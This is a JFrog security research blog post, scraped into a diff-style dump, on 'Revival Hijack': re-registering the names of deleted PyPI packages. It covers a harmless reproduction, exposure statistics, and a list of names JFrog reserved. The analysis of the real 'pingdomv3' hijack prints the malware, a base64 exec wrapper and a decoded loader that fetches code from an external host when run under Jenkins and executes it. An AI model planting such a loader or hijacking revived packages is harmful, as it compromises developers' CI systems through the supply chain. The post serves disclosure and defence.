@@ -1,0 +1,329 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\RevivalHijackPingdomv3863x3001.png
+
+JFrog’s security research team continuously monitors open-source software registries, proactively identifying and addressing potential malware and vulnerability threats to foster a secure and reliable ecosystem for open-source software development and deployment. This blog details a PyPI supply chain attack technique the JFrog research team discovered had been recently exploited in the wild. This attack technique involves hijacking PyPI software packages by manipulating the option to re-register them once they’re removed from PyPI’s index by the original owner; a technique we’ve dubbed “Revival Hijack”.
+Our real-world analysis on PyPI proved the  “Revival Hijack” attack method could be used to hijack 22K existing PyPI packages and subsequently lead to hundreds of thousands of malicious package downloads. Fortunately, our proactive measures thwarted bad actor efforts before significant damage could occur.
+We will describe the effectiveness of this attack and how attackers already used this method to hijack the “pingdomv3” package. Our aim is to raise awareness to this possible attack vector, and share the actions we currently performed to protect the PyPI community from this hijack technique.
+What’s included in this post:
+
+What is the “Revival Hijack” technique?
+
+Reproducing the attack
+The widespread potential of “Revival Hijack”
+
+Reproducing the attack
+The widespread potential of “Revival Hijack”
+Taking action to protect the PyPI community
+The real-world effectiveness of “Revival Hijack”
+PyPI’s existing package hijack mitigations
+A real-world Revival Hijack – The story of pingdomv3
+
+Attack timeline
+Payload analysis
+
+Attack timeline
+Payload analysis
+Disclosure to PyPI maintainers
+Summary
+Appendix A: List of Packages Reserved by JFrog
+Stay up-to-date with JFrog Security Research
+What is the “Revival Hijack” technique?
+One of the most popular attack vectors on users of open-source software repositories is typosquatting, where malicious actors register packages with names slightly altered from popular ones.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\1_Typosquattingattackvector.png
+
+Developers may accidentally install these deceptive packages, leading to potential security breaches. Although this method was once effective, its reliance on human error has been increasingly mitigated by modern development environments, reducing its effectiveness in corporate settings.
+In our analysis of the latest malicious packages in PyPI, we have observed an interesting PyPI policy relating to removed packages. When developers remove their projects from the PyPI repository, the associated package names immediately become available for registration by any other user. The only safeguard is a dialog box that warns the original developers about the potential consequences of their actions –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\2_Projectdeletiondialog.png
+Project deletion dialog
+As stated, unfortunately once a popular project is deleted, attackers can easily hijack the same package name and subsequently infect any user that tries to update that package to the latest version (or – reinstalls it from scratch, which is popular in CI/CD machines that run a static pipeline) –
+Illustration of the “Revival Hijack” PyPI attack
+This Hijack technique is extremely powerful since –
+
+The technique does not rely on the victim making a mistake when installing the package (unlike typosquatting which requires the victim to make a typo)
+Updating a “once safe” package to its latest version is viewed as a safe operation by many users (although it shouldn’t!)
+Many CI/CD machines are already set up to install these packages automatically
+Reproducing the attack
+In order to test the viability of the Revival Hijack attack, we reproduced it in a safe manner. Our experiments revealed more disturbing behavior in the handling of removed packages.
+To reproduce the attack, we created an empty package named revival-package version 1.0.0 and published it from the origin_author account.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\4_SafepackagefortestingRevivalHijack.png
+“Safe” package for testing Revival Hijack
+Then we removed the project and published a package with the same name from a different account: new_author, using version 4.0.0.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\5_HijackedpackagefortestingRevivalHijack.png
+“Hijacked” package for testing Revival Hijack
+The screenshot above confirms that we accomplished this without any issues—the versions belonging to the original user were removed entirely and replaced by the new version from the new “malicious” user.
+The PyPI repository has some safeguards against impersonation – namely, the ability to distinguish between the author’s name in the package metadata and the actual user who published the package. This measure helps prevent unauthorized users from falsely assuming the identity of legitimate authors.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\6_Unverifieddetailsofthepackage.png
+Unverified details of the package
+However, these safeguards do not seem to mitigate the “Revival Hijack” scenario. When we ran pip to show any outdated packages, it happily showed our imposter package as “just a new version” (4.0.0) of the original package – same name but vastly different code!
+$ pip list --outdated
+Package           Version Latest Type
+----------------- ------- ------ -----
+pip               23.0.1  24.0   wheel
+revival-package   1.0.0   4.0.0  wheel
+The pip install --upgrade command doesn’t show any warnings as well, and replaces the original package with our imposter package:
+$ pip install --upgrade revival-package
+Requirement already satisfied: revival-package in ./lib/python3.10/site-packages (1.0.0)
+Collecting revival-package
+  Downloading revival-package-4.0.0-py3-none-any.whl (1.2 kB)
+Installing collected packages: revival-package
+  Attempting uninstall: revival-package
+    Found existing installation: revival-package 1.0.0
+    Uninstalling revival-package-1.0.0:
+      Successfully uninstalled revival-package-1.0.0
+Successfully installed revival-package-4.0.0
+Updating the hijacked package
+Our experiment demonstrates that any removed package can be hijacked immediately and easily after its removal. pip won’t show any warnings despite the fact that the package’s author has changed.
+The widespread potential of “Revival Hijack”
+After demonstrating that hijacking removed legitimate packages can be easily done, we’ve decided to analyze how many packages on PyPI were susceptible to “Revival Hijack” – meaning that they were previously removed and can now be replaced/hijacked.
+A naive count of removed PyPI packages landed us on 120K packages that can be hijacked. However – to understand the real-world potential of the attack, we applied additional filters on this list –
+
+Considered only packages that had more than 100K downloads OR were active for more than six months.
+Filtered out malicious and spam packages
+After applying these filters, we were left with a list of more than 22K packages that are susceptible to “Revival Hijack”.
+How common is package removal in PyPI? On average, 309 packages are removed each month, which means the attack surface of this technique is constantly growing.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\7_AmountofremovedPyPIpackagespermonth.png
+Removed PyPI packages per month
+
+(The sudden spikes in removed packages can be attributed to large malware campaigns in PyPI)
+Why would popular packages even get removed from PyPI? While examining the most popular removed packages, we saw a few reasons for the removal of these legitimate packages –
+
+Introduction of same functionality into official libraries or built-in APIs
+Lack of maintenance (maintainers can’t properly support the library any longer)
+Package gets re-written by the same developer (similar functionality, new package)
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\7_TheJayDeBeApi3packagewasremovedduetoofficialsupportbeingintroduced.png
+The JayDeBeApi3 package was removed due to official support being introduced
+Taking action to protect the PyPI community
+For the sake of securing these packages against hijacking, we created an account called security_holding, in homage to NPM’s method of replacing malicious packages with empty benign ones. Using this account, we “safely hijacked” (reserved) the most downloaded abandoned packages, and replaced them with empty packages (See Appendix A for the full list). By doing this, we’ve prevented real attackers from hijacking these packages and placing malicious code in them.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\8_SecurityHoldingPackage1.png
+One of the abandoned packages we reserved in order to protect the PyPI community
+Additionally, we used the version 0.0.0.1 to make sure that our replacement (empty) packages are not pulled by users who had the old packages installed by running pip update.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\9_pypipackageversion0_0_0_1.png
+The hijacked version number can be seen in the project’s GitHub page
+The real-world effectiveness of “Revival Hijack”
+After successfully reserving these packages, we decided to check whether someone is actually downloading them, even though they’ve been removed for a while. We were surprised to see that in just a few days, we’ve already racked up thousands of downloads, and today (3 months later) we have almost 200K downloads of these “safely hijacked” packages. This seems to indicate that there are outdated jobs and scripts out there which are still looking for the deleted packages, or users that manually downloaded these packages due to typosquatting.
+
+
+jaydebeapi3	178359
+discord-components	7748
+gingerit	5664
+homebrew	3512
+fxcmpy	1574
+fastscript	1185
+tf-nightly-gpu-2-0-preview	540
+threatconnect	519
+python-datamatrix	435
+gbdxtools	395
+Download counts for the top 10 “safely hijacked” PyPI packages
+These download counts show that the “Revival Hijack” threat is incredibly substantial!
+Since our “hijack” package is empty, we cannot be certain that code execution would have occurred in 100% of these download cases (that would require a package with a “ping home” payload) but it would be very safe to say that code execution would occur in the vast majority of these cases. Hijacking packages with such high download counts can definitely be used as a supply chain attack with severe consequences.
+Furthermore, these download numbers are actually a conservative estimate to the effectiveness of a real “Revival Hijack” attack. In order to cause the least amount of changes, we set the version of our empty “hijack” package to 0.0.0.1. This prevents these packages from being pulled by pip update, since the already-installed version would always be higher than 0.0.0.1. A real attacker would use a very high version (such as 9999.9999) in order to make sure pip update is affected as well, similar to a “Dependency Confusion” scenario.
+What caused our reserved packages to have such a high download count, even though the packages were previously abandoned?
+First, the removed package jaydebeapi3 is automatically recommended by the IntelliJ IDEA Python plugin instead of the more popular package jaydebeapi which has 150M downloads.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\10_IntelliJrecommendsinstallingJayDeBeApi3evenafteritwasremovedfromPyPI.png
+IntelliJ recommends installing JayDeBeApi3, even after it was removed from PyPI
+This caused JayDeBeApi3 to rack up a very large number of downloads after we re-registered it with our empty package.
+Also, the packages discord-components and gingerit are used as dependencies in 80 popular GitHub repositories, that were forked more than 150 times. This makes them a perfect target for supply chain attacks –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\11_SomeGitHubrepositoriesthatdependonthegingeritPyPIpackage.png
+Some GitHub repositories that depend on the “gingerit” PyPI package
+
+
+gingerit	305	146
+discord-components	52	13
+discord-buttons	15	2
+gbdxtools	14	2
+Aggregated popularity of packages that depend on our “safely hijacked” packages
+PyPI’s existing package hijack mitigations
+The PyPI registry contains measures to protect against registering deceptive packages using the method ProjectService.create_project. This method will prevent registering new PyPI packages in the following cases –
+
+If the normalized package name matches an existing PyPI package name
+If the normalized package name is in PyPI’s list of blacklisted packages (PyPI doesn’t publish this list)
+If the normalized package name is similar to any existing PyPI package name. The similarity is computed using the following code:
+SELECT lower(
+    regexp_replace(
+        regexp_replace(
+            regexp_replace($1, '(\.|_|-)', '', 'ig'),
+            '(l|L|i|I)', '1', 'ig'
+        ),
+        '(o|O)', '0', 'ig'
+    )
+)
+PyPI’s SQL query to detect typosquatting when registering a new package
+This code protects against simple typosquatting by replacing similar-looking characters with corresponding numbers or removing characters such as periods, underscores, and hyphens. This approach helps to prevent the registration of packages with names that are visually similar to existing ones, thereby mitigating the risk of deceptive or misleading package names.
+These measures cover some techniques used by malware developers, but they are far from comprehensive. While they help prevent the creation of some malicious packages, they do not fully cover all potential vulnerabilities. For instance, the existing blacklist validation could effectively prevent the Revival Hijack attack if the names of removed projects were automatically added to the package blacklist.
+A real-world Revival Hijack – The story of pingdomv3
+Revival Hijack is not just a theoretical attack, but rather – our research team have already seen it exploited in the wild.
+On April 12, 2024, our automated scanning systems detected unusual activity involving the ‘pingdomv3’ package. We observed that the package had acquired a new owner—a detail already marked as a potential red flag. On March 30th, the new owner released a seemingly benign update, rapidly followed by another version introducing a suspicious, Base64-obfuscated payload.
+import logging
+try:
+  from logging import NullHandler
+  if NullHandler:
+    import base64
+    exec(base64.b64decode("dHJ5OgogIC....
+...
+Obfuscated malicious code from the “pingdomv3” package
+These developments triggered immediate alerts within our malicious package scanning framework, prompting a thorough investigation into this malware’s potential risks and consequences.
+Attack timeline
+The package name and its infiltration method are particularly interesting. While typosquatting is the usual attack vector for users of open-source software repositories, this incident presented a more complex method.
+The earliest version of the package, labeled 0.0.2, was released on November 29, 2019. This legitimate package contained a Python implementation of the Pingdom API, a website monitoring service acquired by the SolarWinds software development company in 2014.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\13_Pingdomv3attacktimeline.png
+Pingdomv3 attack timeline
+The original package owner, cheneyyan, maintained a GitHub project which is now unavailable. They released several versions with minor modifications, with the last legitimate update being version 0.0.6 on April 7, 2020.
+Subsequent updates ceased until March 27, 2024, when version 0.1 emerged. This version introduced only one method, invoked from setup.py, which displayed the following message:
+'Hello, please avoid using this package as it is no longer supported. Contact cheney.yan@gmail.com!'
+This indicates that the project was abandoned and advises against its use.
+On March 30, a few days after the release of version 0.1, the original author removed the project and thus the project name became available for registration.
+Summary: Pingdom v3 redeveloped
+
+Home-page: https://github.com/jinnis423/pingdomv3
+
+Author: Jinnis Author-email: jinnis.developer@gmail.com
+Almost immediately after the name became available, an account named Jinnis <jinnis.developer@gmail.com> published a package under the same name, with a newer version number – 1.0.0. This new project claimed to be a redevelopment of the original package, pointing to a non-existent GitHub repository at https://github.com/jinnis423. This version contained the same code as the original.
+A few days later, on April 12, 2024, the new developer released an update containing the malicious payload promptly detected by our team.
+We immediately reported the malware to the PyPI maintainers and received confirmation that it had been removed. Quoting Mike Fiedler, the PyPI Safety & Security Engineer,
+‘After today’s efforts, all versions have been removed, and the name has been prohibited from use.’
+Payload analysis
+The attackers used a typical Python malware payload – dynamic execution of a string after decoding it from Base64, no complex obfuscation techniques were used this time. We quickly extracted the original code for a detailed analysis of the malicious payload.
+try:
+    import requests, os
+    if "JENKINS_URL" in os.environ:
+        r = requests.get('https://yyds.yyzs.workers.dev/meta/statistics')
+        exec(r.text)
+except:
+    pass
+The attackers employed a laconic yet dangerous implementation of Python trojan malware. The code snippet operates within a conditional block that checks for the presence of JENKINS_URL in the environment variables, indicating execution within a Jenkins continuous integration setting.
+Upon confirmation, it performs an HTTP GET request to the URL https://yyds.yyzs.workers.dev/meta/statistics. The response, expected to be Python code, is then directly executed using the exec function.
+Unfortunately, all attempts to retrieve the payload from the server resulted in an empty response. This suggests that the attackers either delayed the delivery of the attack or designed it to be more targeted, possibly limiting it to a specific IP range.
+Disclosure to PyPI maintainers
+The JFrog security research team had reached out to PyPI’s security team in June and disclosed this issue. In our report, we’ve included technical explanations on how to carry out this attack, and also provided statistics about all the packages that were vulnerable to the attack.
+PyPI’s security team responded by saying that –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214131_366638\PyDeleteProj.png
+
+The topic of a policy change on deletion has been discussed on the Python forums, starting back in July 2022 and no conclusion has been reached as of mid-2023.
+PyPI informs end-users of the potential impacts of deletion –
+PyPI prevents specific versions of a package from being replaced, which is in-line with the recently-published Principles for Package Repository Security (General Capabilities, Level 2) from the OpenSSF working group.
+While we agree that all of the above are worthwhile mitigations against this attack technique, as we have demonstrated this is still an extremely viable attack vector which leads to hundreds of thousands of malicious package downloads in real-world conditions.
+We fully advocate PyPI to adopt a stricter policy which completely disallows a package name from being reused. In addition, PyPI users need to be aware of this potential attack vector when considering upgrading to a new package version.
+Summary
+The “Revival Hijack” method can be used by attackers as an easy supply chain attack, targeting organizations and infiltrating a wide variety of environments, allowing attackers to gain control of sensitive resources.
+
+Although our proactive measure of reserving (“security holding”) these packages and adding safe copies will protect the PyPI community from attackers hijacking the most downloaded packages,
+PyPI users should stay vigilant and make sure their CI/CD machines are not trying to install packages that were already removed from PyPI.
+Using a vulnerable behavior in the handling of removed packages allowed attackers to hijack existing packages, making it possible to install it to the target systems without user interaction. Fortunately, this time, our proactive measures thwarted their efforts before significant damage could occur.
+Appendix A: List of Packages Reserved by JFrog
+Following is a list of packages that were taken over by JFrog’s security research team between May 21st and May 28th of 2024, in order to protect them from being hijacked by attackers using the Revival Hijack technique. Our team had reserved these packages using a user called security_holding, by uploading empty packages with a low version number (0.0.0.1) to replace those abandoned packages.
+
+
+aristotle-metadata-registry	2023-08-29 5:12:26	290820
+atlasml	2019-08-06 19:04:36	372854
+automation-rest-server	2024-05-12 8:23:15	411425
+ayulexx	2021-10-26 16:11:10	659435
+azure-iot-provisioning-device-client	2021-10-20 18:34:11	475019
+bbarchivist	2022-01-17 16:11:34	967956
+bdrk	2023-08-29 17:49:35	311483
+bmlx-components	2023-11-15 4:00:19	711548
+callisto-core	2020-08-20 21:12:25	675473
+cdk-demo-construct	2023-12-15 14:42:14	460811
+cdk-s3bucket-ng	2023-12-15 14:42:48	1733714
+continuous-toolbox	2020-04-16 16:45:59	515633
+darwin-shared	2022-06-02 18:58:20	293223
+discord-buttons	2022-02-06 8:43:03	320966
+discord-components	2022-08-06 16:02:20	7248408
+discovery-behavioral-utils	2021-02-24 14:49:32	277874
+django-aparnik	2021-01-10 6:40:40	652502
+django-wizard-builder	2020-08-20 21:12:58	332256
+docparser-remittance-processor	2023-06-18 5:42:16	302949
+dofast	2023-09-15 7:11:34	289635
+edavisuals	2022-10-03 13:06:55	35
+fastscript	2024-05-01 0:42:56	285846
+fluidasserts	2018-06-15 15:55:08	10555786
+fluidattacks	2020-09-28 2:23:45	8119906
+fxcmpy	2023-11-29 14:59:27	271068
+gbdxtools	2022-01-03 17:52:59	353003
+gingerit	2023-08-08 12:00:56	363463
+hgstools	2023-07-04 9:07:27	617743
+homebrew	2023-10-10 16:22:12	344357
+jaydebeapi3	2019-04-04 9:38:20	621968
+jhtalib	2023-07-28 14:49:12	329138
+leadguru-common	2021-03-23 17:16:28	499810
+leadguru-data	2021-03-23 17:05:37	519503
+ledger-dev	2019-06-20 10:27:43	746878
+lfc	2020-05-20 15:07:29	314241
+lhcsmapi	2022-04-21 7:05:51	907312
+li-pagador	2021-08-05 13:50:01	547684
+lnhub-rest	2024-01-06 14:38:59	378363
+malaya-gpu	2021-07-10 7:10:52	271898
+napplib	2023-02-09 12:01:12	389274
+nnabla-ext-cuda90	2021-08-16 3:17:43	288695
+pipomatic-hudge-xtracta	2023-05-26 21:41:41	314270
+pl-nightly	2022-05-25 16:25:10	495312
+plantit-cli	2022-03-04 1:19:12	301349
+plenum-dev	2019-06-20 10:24:08	1063672
+print-nanny-client	2022-04-12 19:11:26	338748
+pyhawk-with-a-single-extra-commit	2018-10-04 9:40:35	2904494
+python-datamatrix	2023-01-23 15:57:02	355833
+pytorch-ignite-nightly	2020-11-10 10:07:37	299036
+quality-report	2023-03-30 11:54:36	1722367
+rattail-locsms	2020-01-22 5:18:32	279016
+rsscrawler	2021-04-18 10:57:59	314321
+silverbot	2022-09-10 7:34:44	365814
+slash-discord-py	2021-11-03 20:51:38	401675
+sovrin-client-dev	2019-06-20 10:07:08	356086
+sovrin-common-dev	2019-06-20 10:27:31	638631
+sovrin-node-dev	2019-06-20 10:23:45	694709
+stormpath	2021-10-10 16:38:22	304746
+stumpf	2022-05-17 17:41:18	388793
+super-ec2	2023-12-15 14:48:36	596893
+tableau-rest-api	2021-04-16 19:03:18	464685
+testgithubactionscookiecuttercppproject	2022-07-07 12:18:14	704976
+tf-nightly-gpu-2-0-preview	2020-02-24 19:48:08	803363
+threatconnect	2023-12-13 18:35:04	3506308
+vmnet	2020-01-14 7:45:46	492185
+zhulong	2023-02-23 11:06:54	407328
+Stay up-to-date with JFrog Security Research
+The security research team’s findings and research play an important role in improving the JFrog Software Supply Chain Platform’s application software security capabilities.
+Follow the latest discoveries and technical updates from the JFrog Security Research team on our research website, and on X @JFrogSecurity.
+
+Reproducing the attack
+The widespread potential of “Revival Hijack”
+
+Attack timeline
+Payload analysis
+pip
+pip install --upgrade
+pip
+pip update
+“Hijacked” package
+# Downloads
+jaydebeapi3
+178359
+discord-components
+7748
+gingerit
+5664
+homebrew
+3512
+fxcmpy
+1574
+fastscript
+tf-nightly-gpu-2-0-preview
+540
+threatconnect
+519
+python-datamatrix
+435
+395
+pip update
+pip update
+Package name
+# of Watchers on dependants
+# of Forks on dependants
+ProjectService.create_project
+'Hello, please avoid using this package as it is no longer supported. Contact cheney.yan@gmail.com!'
+Summary: Pingdom v3 redeveloped
+
+Home-page: https://github.com/jinnis423/pingdomv3
+
+Author: Jinnis Author-email: jinnis.developer@gmail.com
+JENKINS_URL
+https://yyds.yyzs.workers.dev/meta/statistics
+exec
